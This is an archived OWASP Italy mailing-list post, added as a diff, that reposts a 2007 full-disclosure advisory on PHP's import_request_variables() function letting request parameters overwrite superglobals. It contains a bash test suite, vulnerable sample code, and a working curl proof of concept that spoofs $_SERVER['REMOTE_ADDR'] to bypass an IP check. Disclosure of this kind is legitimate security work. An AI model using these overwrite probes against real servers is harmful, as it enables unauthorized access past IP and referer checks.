@@ -1,0 +1,315 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+ <HEAD>
+   <TITLE> [Owasp-italy] PHP import_request_variables() arbitrary variable	overwrite
+   </TITLE>
+   <LINK REL="Index" HREF="index.html" >
+   <LINK REL="made" HREF="mailto:owasp-italy%40lists.owasp.org?Subject=%5BOwasp-italy%5D%20PHP%20import_request_variables%28%29%20arbitrary%20variable%0A%09overwrite&In-Reply-To=">
+   <META NAME="robots" CONTENT="index,nofollow">
+   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
+   <LINK REL="Previous"  HREF="000243.html">
+   <LINK REL="Next"  HREF="000244.html">
+ </HEAD>
+ <BODY BGCOLOR="#ffffff">
+   <H1>[Owasp-italy] PHP import_request_variables() arbitrary variable	overwrite</H1>
+    <B>Stefano Di Paola</B> 
+    <A HREF="mailto:owasp-italy%40lists.owasp.org?Subject=%5BOwasp-italy%5D%20PHP%20import_request_variables%28%29%20arbitrary%20variable%0A%09overwrite&In-Reply-To="
+       TITLE="[Owasp-italy] PHP import_request_variables() arbitrary variable	overwrite">stefano.dipaola at wisec.it
+       </A><BR>
+    <I>Thu Mar  8 18:16:22 EST 2007</I>
+    <P><UL>
+        <LI>Previous message: <A HREF="000243.html">[Owasp-italy] Bozza di presentazione sulla sicurezza del	software
+</A></li>
+        <LI>Next message: <A HREF="000244.html">[Owasp-italy] Spring of Code: Bh&#233; incrociamo le dita...
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#241">[ date ]</a>
+              <a href="thread.html#241">[ thread ]</a>
+              <a href="subject.html#241">[ subject ]</a>
+              <a href="author.html#241">[ author ]</a>
+         </LI>
+       </UL>
+    <HR>  
+<!--beginarticle-->
+<PRE>Ciao ragazzi, 
+nel caso ci sia qualcuno non iscritto alle varie ml, posto anche qui.
+Buona lettura
+Stefano
+
+..........................................................
+
+PHP import_request_variables() arbitrary variable overwrite
+
+ Name              Using import_request_variables() you can overwrite
+                   $_* and $* (any php variable).
+ Systems Affected  PHP &gt;=4.0.7 &lt;=5.2.1
+ Severity          High
+ Vendor            <A HREF="http://www.php.net/">http://www.php.net/</A>
+ Advisory          <A HREF="http://www.wisec.it/vulns.php?id=10">http://www.wisec.it/vulns.php?id=10</A>
+                   <A HREF="http://www.wisec.it/vuln_10.txt">http://www.wisec.it/vuln_10.txt</A>
+ Authors           Stefano `wisec` di Paola (<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">stefano.dipaola at wisec.it</A>)
+                   Francesco `ascii` Ongaro (<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">ascii at ush.it</A>)
+ Date              20060307
+
+I. BACKGROUND
+
+PHP is a scripting language. Since in the past PHP enabled by default
+GLOBALS programmers wrote applications using this input method, nowadays
+the globals on configuration has gone (while still used by many web
+hosting companies) and programmers instead rewriting their code wrote
+added patches to re implement superglobals their own.
+
+These codes gave developers more troubles than benefits so PHP
+developers wrote a function to securely import a part of the whole
+&quot;_REQUEST&quot;, this function is named import_request_variables() and exists
+since PHP 4.0.7.
+
+II. DESCRIPTION
+
+&gt;<i>From the PHP manual:
+</I>
+[quote]
+Imports GET/POST/Cookie variables into the global scope. It is useful if
+you disable register_globals, but would like to see some variables in
+the global scope.
+[/quote]
+
+So import_request_variables() emulate register globals on and is a bit
+different from extract().
+
+[quote]
+Note: Although the prefix parameter is optional, you will get an
+E_NOTICE level error if you specify no prefix, or specify an empty
+string as a prefix. This is a possible security hazard. Notice level
+errors are not displayed using the default error reporting level.
+[/quote]
+
+They warn you about the prefix thing, this is right for two reasons: the
+first is that without prefix you have the same problems of globals on (but
+it's also true that if you code everything with the prefix you return to
+the starting point.
+
+The second is the one explained in this advisory: using the function
+import_request_variables() enable people to overwrite the following
+arrays: $_GET $_POST $_COOKIE $_FILES $_SERVER $_SESSION and all the 
+others not mentioned.
+
+We are conducting further investigations on _FILES, it seems possible to 
+overwrite the array but we are not sure that it could be used to trick 
+file upload scripts.
+
+Given the specified entry points (the first argument of the function is
+a case insensitive string of the input methods that will be imported,
+G for GET, P for POST and C for COOKIE) a remote attacker will be able
+to overwrite any internal and protected array.
+
+The result is that if you use REGISTER GLOBALS ON you are MUCH MORE safe.
+
+There is a little bonus: as highlighted in the code snippets on the following
+ANALYSIS section the P char will enable both POST and FILES entry point
+so import_request_variables('GPC') will give a global scope to
+everything specified in GET POST COOKIE and FILES.
+
+III. ANALYSIS
+
+import_request_variables() is not new to vulnerabilities: consider this
+change log entry for 24 Nov 2005, PHP 5.1.
+
+[quote]
+- Fixed potential GLOBALS overwrite via import_request_variables() and
+  possible crash and/or memory corruption. (Ilia)
+[/quote]
+
+Use the following test suite: run the script in a writable directory
+inside a document root then point your browser to the test.php files and
+make your tests.
+
+--- &gt;8 --- &gt;8 --- &gt;8 --- &gt;8 --- testsuite.sh --- &gt;8 --- &gt;8 --- &gt;8 --- &gt;8
+
+#!/bin/bash
+
+mkdir hack-php_import_request_variables &amp;&amp; cd
+hack-php_import_request_variables
+
+echo &quot;Testing cli..&quot;
+
+echo &quot;register_globals = Off&quot; &gt; php-ini-globals-off
+php -c php-ini-globals-off -r &quot;echo (int)ini_get(&quot;register_globals&quot;);&quot;
+
+echo &quot;register_globals = On&quot; &gt; php-ini-globals-on
+php -c php-ini-globals-on -r &quot;echo (int)ini_get(&quot;register_globals&quot;);&quot;
+
+echo &quot;Testing mod..&quot;
+
+mkdir globals-on &amp;&amp; mkdir globals-off
+
+cat &gt; globals-on/test.php &lt;&lt; TOKEN
+&lt;pre&gt;&lt;?php
+echo 'GLOBALS '.(int)ini_get(&quot;register_globals&quot;).&quot;n&quot;;
+import_request_variables('GPC');
+echo '&lt;h1&gt;GET&lt;/h1&gt;'.&quot;n&quot;; print_r(\$_GET);
+echo '&lt;h1&gt;POST&lt;/h1&gt;'.&quot;n&quot;; print_r(\$_POST);
+echo '&lt;h1&gt;COOKIE&lt;/h1&gt;'.&quot;n&quot;; print_r(\$_COOKIE);
+echo '&lt;h1&gt;SERVER&lt;/h1&gt;'.&quot;n&quot;; print_r(\$_SERVER);
+echo '&lt;h1&gt;SESSION&lt;/h1&gt;'.&quot;n&quot;; print_r(\$_SESSION);
+echo '&lt;h1&gt;FILES&lt;/h1&gt;'.&quot;n&quot;; print_r(\$_FILES);
+?&gt;&lt;/pre&gt;
+TOKEN
+cp globals-on/test.php globals-off/test.php
+
+echo &quot;php_value register_globals on&quot; &gt; globals-on/.htaccess
+echo &quot;php_value register_globals off&quot; &gt; globals-off/.htaccess
+
+--- &gt;8 --- &gt;8 --- &gt;8 --- &gt;8 --- ------------ --- &gt;8 --- &gt;8 --- &gt;8 --- &gt;8
+
+Suggested tests are:
+ - test.php?_SERVER=string (overwrite $_SERVER array and make it a string)
+ - test.php?_SERVER[REMOTE_ADDR]=bypass client ip validation
+ - test.php?_SERVER[HTTP_REFERER]=bypass referer validation
+
+Etc.. Add your POST/COOKIE/FILES probes.
+
+The vulnerable code is in the following files:
+./ext/standard/basic_functions.c:PHP_FUNCTION(import_request_variables)
+./Zend/zend_hash.c:ZEND_API void
+zend_hash_apply_with_arguments(HashTable *ht, apply_func_args_t
+apply_func, int num_args, ...)
+
+Vulnerable code snippet:
+
+PHP_FUNCTION(import_request_variables) {
+[..]
+if (prefix_len == 0) {
+ php_error_docref(NULL TSRMLS_CC, E_NOTICE, &quot;No prefix specified -
+possible security hazard&quot;);
+}
+[..]
+ for (p = types; p &amp;&amp; *p; p++) {
+  switch (*p) {
+   case 'g': case 'G':
+zend_hash_apply_with_arguments(Z_ARRVAL_P(PG(http_globals)[TRACK_VARS_GET]),
+(apply_func_args_t) copy_request_variable, 2, prefix, prefix_len);break;
+   case 'p': case 'P':
+zend_hash_apply_with_arguments(Z_ARRVAL_P(PG(http_globals)[TRACK_VARS_POST]),
+(apply_func_args_t) copy_request_variable, 2, prefix, prefix_len);
+zend_hash_apply_with_arguments(Z_ARRVAL_P(PG(http_globals)[TRACK_VARS_FILES]),
+(apply_func_args_t) copy_request_variable, 2, prefix, prefix_len);
+break;
+   case 'c': case 'C':
+zend_hash_apply_with_arguments(Z_ARRVAL_P(PG(http_globals)[TRACK_VARS_COOKIE]),
+(apply_func_args_t) copy_request_variable, 2, prefix, prefix_len);break;
+  }
+ }
+[..]
+}
+
+As you can see there are different entry points but the &quot;output&quot; is the
+global scope.
+
+--- &gt;8 --- &gt;8 --- &gt;8 --- &gt;8 --- example.php --- &gt;8 --- &gt;8 --- &gt;8 --- &gt;8
+&lt;?php
+echo 'GLOBALS '.(int)ini_get(&quot;register_globals&quot;).&quot;n&quot;;
+import_request_variables('GPC');
+if ($_SERVER['REMOTE_ADDR'] != '10.1.1.1') die('Go away!');
+echo 'Hello admin!';
+?&gt;
+--- &gt;8 --- &gt;8 --- &gt;8 --- &gt;8 --- ----------- --- &gt;8 --- &gt;8 --- &gt;8 --- &gt;8
+
+curl <A HREF="http://URL/example.php?_SERVER[REMOTE_ADDR]=10.1.1.1">http://URL/example.php?_SERVER[REMOTE_ADDR]=10.1.1.1</A>
+Will give you: Hello admin!
+
+Now that this is disclosed probably you would consider this url:
+<A HREF="http://www.google.com/codesearch?q=lang%3Aphp+import_request_variables">http://www.google.com/codesearch?q=lang%3Aphp+import_request_variables</A>
+
+IV. DETECTION
+
+All the PHP versions &gt;=4.0.7 &lt;=5.2.1 are vulnerable.
+
+V. WORKAROUND
+
+Dunno.
+
+VI. VENDOR RESPONSE
+
+Will fix, probably.
+
+VII. CVE INFORMATION
+
+No CVE at this time.
+
+VIII. DISCLOSURE TIMELINE
+
+20060301 Discovery
+20060302 Private testing
+20060304 Tea time
+20060305 Snowboard lesson
+20060308 Full disclosure
+
+IX. CREDIT
+
+Stefano di Paola is credited with the discovery of this vulnerability.
+
+X. LEGAL NOTICES
+
+Copyright (c) 2007 Stefano di Paola
+
+Note: this exploit is DOUBLE LICENSED, 
+1. if you'll use it for personal and non-profit purposes you can 
+   apply GPL v2 and above. 
+   
+2. In the case you plain to: 
+   a. use our code in any commercial context
+   b. implement this code in your non-GPL application
+   c. use this code during a Penetration Test
+   d. make any profit from it 
+   
+  you need to contact me in order to obtain a _commercial license_.
+
+Permission is granted for the redistribution of this alert
+electronically. It may not be edited in any way without my express
+written consense. If you wish to reprint the whole or any
+part of this alert in any other medium other than electronically, please
+email me for permission.
+
+Disclaimer: The information in the advisory is believed to be accurate
+at the time of publishing based on currently available information. Use
+of the information constitutes acceptance for use in an AS IS condition.
+There are no warranties with regard to this information. Neither the
+author nor the publisher accepts any liability for any direct, indirect,
+or consequential loss or damage arising from use of, or reliance on,
+this information.
+
+
+-- 
+...oOOo...oOOo....
+Stefano Di Paola
+Software &amp; Security Engineer
+
+Web: www.wisec.it
+..................
+
+</PRE>
+
+
+
+
+<!--endarticle-->
+    <HR>
+    <P><UL>
+        <!--threads-->
+	<LI>Previous message: <A HREF="000243.html">[Owasp-italy] Bozza di presentazione sulla sicurezza del	software
+</A></li>
+	<LI>Next message: <A HREF="000244.html">[Owasp-italy] Spring of Code: Bh&#233; incrociamo le dita...
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#241">[ date ]</a>
+              <a href="thread.html#241">[ thread ]</a>
+              <a href="subject.html#241">[ subject ]</a>
+              <a href="author.html#241">[ author ]</a>
+         </LI>
+       </UL>
+
+<hr>
+<a href="http://lists.owasp.org/mailman/listinfo/owasp-italy">More information about the Owasp-italy
+mailing list</a><br>
+</body></html>
